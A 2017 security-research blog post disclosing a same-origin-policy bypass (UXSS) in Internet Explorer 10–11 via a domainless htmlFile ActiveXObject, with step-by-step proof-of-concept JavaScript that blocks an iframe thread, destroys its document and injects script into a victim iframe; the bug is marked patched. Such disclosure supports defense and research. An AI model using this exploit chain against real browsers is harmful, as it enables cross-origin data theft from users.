<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="alternate icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Astro v5.16.6"><title>SOP bypass / UXSS - More Adventures in a Domainless World (IE)</title><meta name="description" content><link rel="canonical" href="https://www.brokenbrowser.com/blog/uxss-ie-domainless-world/"><meta property="og:title" content="SOP bypass / UXSS - More Adventures in a Domainless World (IE)"><meta property="og:description" content><meta property="og:type" content="website"><meta property="og:url" content="https://www.brokenbrowser.com/blog/uxss-ie-domainless-world/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="SOP bypass / UXSS - More Adventures in a Domainless World (IE)"><meta name="twitter:description" content><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.xml"><link rel="stylesheet" href="/_astro/_slug_.D8CnJWvD.css"></head> <body> <div class="container center"> <header class="header"> <div class="header__inner"> <div class="header__logo"> <a href="/"> <div class="logo">
MagicMac Labs
</div> </a> </div> <ul class="menu menu--mobile"> <li class="menu__trigger">Menu ▾</li> <li> <ul class="menu__dropdown"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </li> </ul> </div> <nav class="navigation-menu"> <ul class="navigation-menu__inner menu--desktop"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </nav> </header> <main class="content">  <article> <h1 class="post-title">SOP bypass / UXSS - More Adventures in a Domainless World (IE)</h1> <div class="post-meta"> <time> <time datetime="2017-03-20T00:00:00.000Z"> 2017-03-20 </time> </time> <span class="post-category"> :: browser-workshop</span>  </div>  <div class="post-content">  <p>A few months ago we’ve been playing with <a href="../uxss-edge-domainless-world/">domainless about:blank</a> pages on Edge. Essentially, a powerful about:blank document was capable of accessing every domain without restrictions. It was <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0002">recently patched as CVE-2017-0002</a> so it does not work anymore. The same thing happens with the <a href="../uxss-ie-htmlfile/">ActiveXObject/htmlFile</a> (from now on, <strong>htmlFile</strong>) which was <a href="https://technet.microsoft.com/library/security/MS17-006">patched last week</a> as <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0154">CVE-2017-0154</a>.</p>
<p>If you haven’t read those two methods to achieve UXSS/SOP bypass, please do it now because what’s coming assumes that we are familiar with them. Thanks bug hunter!</p>
<p>Our goal today is to <strong>port our original Edge bug to Internet Explorer</strong>, which should be an easy task considering that <a href="../on-patching-security-bugs/">Microsoft halfheartedly patches IE</a>.  Take a look at the current state of both bugs:</p>
<p><img src="/images/2017/03/01-patched-bugs-1.png" alt=""></p>
<h3 id=""></h3>
<h3 id="create-a-domainless-aboutblank-on-ie">Create a domainless about:blank on IE</h3>
<p>In the original bug, we were using a data: uri to create the domainless blank, how can we achieve the same on IE? Well, htmlFile comes to the rescue again, because the patch does not allow us to set an arbitrary domain anymore, but we can still set a it to blank, or, domainless.</p>
<p>To create a domainless htmlFile we first need a destroyed document, in other words, a document that does not exist anymore. And how can we create something out of nothing? That’s more of a question for <a href="https://twitter.com/neiltyson">Neil deGrasse Tyson</a>, but I’ll do my best to reply! :)</p>
<p>The idea is simple in reality. We just need to make sure that things happen in the correct order.</p>
<ol>
<li>Save a reference to the ActiveXObject of an iframe</li>
<li>Instantiate the htmlFile at least once (so IE does not destroy it)</li>
<li>Block the iframe thread (so IE does not have a chance to destroy our reference)</li>
<li>Destroy the document of the iframe (using a document.open)</li>
<li>Instantiate the htmlFile again. It is now domainless</li>
</ol>
<p>Steps 2 and 3 are really important here. Skipping step 2 will prevent us to save a <strong>usable</strong> reference. Skipping step 3 will allow IE to destroy the object.</p>
<p>Bug hunter, we’ve seen this blocking-thread idea <a href="../uxss-ie-htmlfile/">in the past</a> (check at the very bottom of that post) which can be used to create a vast amount of vulnerabilities. The blocking thread technique that we will use below is a very visible, bold alert. This way we won’t be feeding real attackers, or at least they will have to find a solution by themselves to make this PoC completely invisible. Take a look at the code below.</p>
<h3 id="domainless-htmlfile">Domainless htmlFile</h3>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-comment)">// We will attack the iframe below</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// &#x3C;iframe name="victim_iframe" src="https://www.google.com/recaptcha/...">&#x3C;/iframe></span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// Render an iframe (we will destroy its document later)</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">document</span><span style="color:var(--astro-code-token-function)">.</span><span style="color:var(--astro-code-token-constant)">body</span><span style="color:var(--astro-code-token-function)">.insertAdjacentHTML</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">'beforeEnd'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)">'&#x3C;iframe name="ifr">&#x3C;/iframe>'</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// Save a reference to its ActiveXObject</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">var</span><span style="color:var(--astro-code-foreground)"> ifr_ActiveXObject </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> ifr</span><span style="color:var(--astro-code-foreground)">.ActiveXObject;</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// Make sure IE does not invalidate our reference</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">new</span><span style="color:var(--astro-code-token-function)"> ifr_ActiveXObject</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"htmlFile"</span><span style="color:var(--astro-code-foreground)">); </span><span style="color:var(--astro-code-token-comment)">// We don't even need save this instance</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// Block the iFrame so the ActiveXObject object is never destroyed</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">ifr</span><span style="color:var(--astro-code-token-function)">.setTimeout</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">'alert("Do not close me until the PoC finishes, please.");'</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"></span></code></pre>
<p>Have you realized that we used a setTimeout to execute the blocking alert? That’s because we still need to continue doing things, and if we do the alert directly on the iframe, it will block the UI and not execute what’s coming below. Our goal now is to destroy the contents of the iframe while the blocking alert remains there. Remember that the alert is what prevents IE from destroying the ActiveXObject.</p>
<p>Now we will destroy the document of the iframe and create the domainless htmlFile. If document.open is unfamiliar to you, for this PoC you can think of it as if it were a document.write.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-comment)">// Destroy the iframe document</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">ifr</span><span style="color:var(--astro-code-token-function)">.</span><span style="color:var(--astro-code-token-constant)">document</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">();</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// Instantiate a domainless htmlFile</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">var</span><span style="color:var(--astro-code-foreground)"> domainlessDoc </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-keyword)"> new</span><span style="color:var(--astro-code-token-function)"> ifr_ActiveXObject</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"htmlFile"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"></span></code></pre>
<p>Excellent! At this point we have now a our domainless htmlFile. All we need to do now is load an iframe with the URL that we want to access, and bingo! The exact details on how to do this are described in the <a href="../uxss-edge-domainless-world/">original adventures in a domainless world</a> post. But essentially, we are loading any site with iframes and changing any of them to an about:blank (which belongs to the iframe domain). Then, we can freely access this blank (bypassing the SOP) from our domainless htmlFile.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-comment)">// Inject the code in victim's inner iframe</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">domainlessDoc</span><span style="color:var(--astro-code-token-function)">.</span><span style="color:var(--astro-code-token-constant)">parentWindow</span><span style="color:var(--astro-code-token-function)">.setTimeout</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"victim_iframe[0].location = 'javascript:alert(parent.document.domain);'"</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<p>Want to see this in action? This one works straight out of the box on IE10 and IE11, but with a little tweak it should work also from IE6 to IE11 . We won’t tweak it here but if you are curious, <a href="https://twitter.com/magicmac2000">let me know</a>.</p>
<p><img src="/images/2017/03/02-xdom-poc.png" alt=""></p>
<p><strong>[ Patched on 2017-04-11 ]</strong></p>
<p>Bug hunter, let me remind you that the htmlFile still has tons of things to discover. I believe it’s worth spending a rainy afternoon researching on it!</p>
<p>In my opinion, the best way to patch all htmlFile related bugs is by completely disabling its instantiation from iexplore.exe. Unfortunately I don’t have the big picture and I imagine there’s a good reason to keep it alive, but honestly, I don’t know how in the world developers will patch it. There are too many things that are beyond IE awareness once this object is instantiated.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-comment)">// If this code returns ACCESS_DENIED attackers will lose an amazing weapon</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">new</span><span style="color:var(--astro-code-token-function)"> ActiveXObject</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"htmlFile"</span><span style="color:var(--astro-code-foreground)">);  </span><span style="color:var(--astro-code-token-comment)">// Do not allow this anymore!</span></span></code></pre>
<p>Have a nice day!</p>
<p><a href="https://twitter.com/magicmac2000">Manuel</a></p> <div class="pagination"> <div class="pagination__title"> <span class="pagination__title-h">Read other posts</span> <hr> </div> <div class="pagination__buttons">  <a href="/blog/bypass-the-patch-to-keep-spoofing-the-address-bar-with-the-malware-warning/" class="button inline prev">
&lt; [Bypassing the patch to keep spoofing the Smartscreen/Malware warning (Edge)]
</a> <span>::</span> <a href="/blog/referer-spoofing-patch-bypass/" class="button inline next">
[Referrer spoofing with iframe injection (Edge)] &gt;
</a> </div> </div>  </div> </article> <script type="module">document.addEventListener("DOMContentLoaded",()=>{document.querySelectorAll("pre.astro-code").forEach(t=>{const n=document.createElement("div");n.className="highlight",t.parentNode?.insertBefore(n,t),n.appendChild(t);const a=t.getAttribute("data-language")||"text",o=document.createElement("div");if(o.className="code-title",o.textContent=a,navigator.clipboard){const e=document.createElement("button");e.className="copy-button",e.textContent="Copy",e.addEventListener("click",async()=>{const c=t.textContent||"";try{await navigator.clipboard.writeText(c),e.textContent="Copied",setTimeout(()=>{e.textContent="Copy"},1e3)}catch(r){console.error("Failed to copy:",r)}}),o.appendChild(e)}n.insertBefore(o,t)})});</script>  <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>  </main> <footer class="footer"> <div class="footer__inner"> <div class="copyright"> <span>© 2026 MagicMac Labs</span> </div> </div> </footer> </div> <script type="module">(()=>{const s=document.querySelector(".container"),o=document.querySelectorAll(".menu");document.body.addEventListener("click",()=>{o.forEach(e=>{e.classList.contains("open")&&e.classList.remove("open")})}),window.addEventListener("resize",()=>{o.forEach(e=>{e.classList.remove("open")})}),o.forEach(e=>{const i=e.querySelector(".menu__trigger"),t=e.querySelector(".menu__dropdown");i&&t&&(i.addEventListener("click",n=>{n.stopPropagation(),e.classList.contains("open")?e.classList.remove("open"):(o.forEach(c=>c.classList.remove("open")),e.classList.add("open")),s&&t.getBoundingClientRect().right>s.getBoundingClientRect().right&&(t.style.left="auto",t.style.right="0")}),t.addEventListener("click",n=>n.stopPropagation()))})})();</script> </body> </html> 